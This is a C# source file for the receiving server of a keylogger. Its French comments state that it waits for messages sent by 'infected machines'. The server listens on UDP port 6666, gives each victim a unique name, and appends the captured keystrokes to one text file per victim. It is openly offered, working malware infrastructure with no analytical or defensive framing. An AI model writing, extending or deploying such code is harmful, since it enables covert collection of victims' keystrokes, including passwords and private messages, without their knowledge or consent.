using System;
using System.Text;
using System.IO;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Net;
using System.Threading.Tasks;

namespace Serveur_keylogger
{
    internal class Program
    {

        // Variable global pour fixer les chemins des fichiers et dossiers du serveur
        // Il est possible de modifier les arborescences en fonction de votre serveur
        static string Save_user = @"C:\Users\" + Environment.UserName +@"\Desktop\myUser.txt"; // fichier de sauvegarde des utilisateurs
        static string Save_file_kl = @"C:\Users\" + Environment.UserName + @"\Desktop\file_kl\"; // emplacement des fichiers
        
        //Methode de vérification si la liste des utilisateurs est la ou pas
        public static void Check_if_need_create_db()
        {
            if (!File.Exists(Save_user))
            {
                StreamWriter sw = new StreamWriter(Save_user, false);
            }

        }

        // Permet de recuperer la taille des paquets à transferer
        static int getLenght_byte(byte[] b)
        {
            int a = 0;
            foreach (byte elem in b)
            {
                a++;
            }
            return a;
        }


        // Méthode central pour traiter les paquets qu'on recoit
        public static string Cut_head_data(string s)
        {
            // On sépare l'en-tete du corps
            string[] sub_s = s.Split(';'); 
            

            //Si c'est une demande de création

            if (sub_s[0] == "creation utilisateur svp")
            {
                string name = sub_s[1]; //dans ce cas - 0 = en-tete | 1 = message
                bool not_in_list = false; // variable qui permet de refaire la lecture des utilisateurs pour etre sur de ne pas avoir de doublon
                
                // On verifie si on a deja ce nom d'utilisateur 
                while (!not_in_list)
                {
                    not_in_list = true;
                    using (StreamReader sr = new StreamReader(Save_user))
                    {
                        string l;
                        int add_to_name = 1;
                        while ((l = sr.ReadLine()) != null)
                        {
                            if (l == name)
                            {
                                not_in_list = false;
                                name = name + "_" + add_to_name.ToString();
                                add_to_name++;
                            }
                        }
                        sr.Close();
                    }
                }
                // on ajoute l'utilisateur
                File.AppendAllText(Save_user, name + "\r\n");

                // On crée le fichier
                var f = File.Create(Save_file_kl+"\\" + sub_s[1] + ".txt");
                f.Close();
                // On retourne un chaine de caractère avec le nom pour le renvoyer au client
                return name;

            }

            //Si ce n'est pas une demande de creation d'utilisateur
            else
            {
                // Affichage pour comprendre ce qu'il se passe du coté du serveur
                Console.WriteLine("on ecrit chez " + sub_s[0]);

                //On vérifie si le fichier est bien présent
                string arbo = Save_file_kl + sub_s[0] + ".txt";
                if (!File.Exists(arbo))
                {
                    var f = File.Create(arbo);
                    f.Close();
                }
                //On écrit dans le fichier
                File.AppendAllText(arbo, sub_s[1]+ "\n");
                
                return "";
            }
                
        }

        static void Main(string[] args)
        {
            // On vérifie si on a bien un fichier qui sert à la liste des utilisateurs connu
            Check_if_need_create_db();

            // On ouvre le port 6666 pour écouter ou envoyer
            UdpClient serveur = new UdpClient(6666);

            while (true) // le but est d'attendre les messages envoyés par les machines infectées
            {
                //On commence par écouter 
                IPEndPoint serv_ip = new IPEndPoint(IPAddress.Any, 6666);
                byte[] buffer = serveur.Receive(ref serv_ip); // On attend les données
                
                // On convertit le résultat recu en chaine de caractère
                string S_buffer = Encoding.Default.GetString(buffer);
                
                // On traite les données recues
                string answer = Cut_head_data(S_buffer);
                Console.WriteLine(answer); // Affichage informatif
                
                if(answer != "")
                {
                    serveur.Send(Encoding.ASCII.GetBytes(answer), getLenght_byte(Encoding.ASCII.GetBytes(answer)),serv_ip);
                }
               
            }
        }
    }
}
